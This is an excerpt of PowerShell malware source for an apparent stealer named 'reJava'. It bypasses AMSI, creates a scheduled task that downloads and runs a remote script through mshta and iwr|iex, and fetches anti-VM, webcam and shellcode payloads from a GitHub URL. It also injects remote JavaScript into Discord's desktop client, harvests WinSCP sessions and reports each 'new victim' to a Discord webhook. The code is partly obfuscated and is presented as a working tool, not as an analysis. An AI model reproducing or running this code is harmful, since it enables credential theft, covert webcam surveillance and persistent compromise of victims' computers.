...
function CHECK_AND_PATCH {
    ${reJava} = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils').GetField('am' + 'siInitFailed', 'NonPublic,Static');
    ...
    $reJavacheck = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
    return $reJavacheck
}
...
function Invoke-TASKS {
    ...
    if ($persistence) {
        ...
        $task_action = if ($debug) {
            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook = '$webhook' ; iwr https://raw.githubusercontent.com/VD23K23ZX94/GT1NKV98IUYXZ4/main/autorun.ps1 | iex`""
        } else {
            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/VD23K23ZX94/GT1NKV98IUYXZ4/main/autorun.ps1')|iex`",0)(window.close)"
        }
    ...
    if ($blockhostsfile) {
        $link = "https://raw.githubusercontent.com/VD23K23ZX94/GT1NKV98IUYXZ4/main/blockhosts.ps1"
...
function VMPROTECT {
    $link = ("https://raw.githubusercontent.com/VD23K23ZX94/GT1NKV98IUYXZ4/main/antivm.ps1")
...
function Backup-Data {
   ...
   Get-WinSCPSessions
    ...
    $webcam = ("https://raw.githubusercontent.com/VD23K23ZX94/GT1NKV98IUYXZ4/main/webcam.ps1")
            ...
            if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match "discord_desktop_core")) {
                ...
                foreach ($file in $files) {
                    if ($file.Name -eq "index.js") {
                        ...
                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/VD23K23ZX94/GT1NKV98IUYXZ4/main/injection.js")
                        if ($content -ne "") {
    ...
    $reJava_shellcode = ("https://raw.githubusercontent.com/VD23K23ZX94/GT1NKV98IUYXZ4/main/reJava_shellcode.ps1")
    $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$reJava_shellcode')"
    ...
    $embed_and_body = @{
        ...
        "embeds"      = @(
            @{
                "title"       = "reJava"
                "url"         = "https://discord.gg/wDHPzKRQ"
                "description" = "New victim yoy !"
                "color"       = "00000000"
                "footer"      = @{
                    "text" = "Made by SelfJect"
                }
                "thumbnail"   = @{
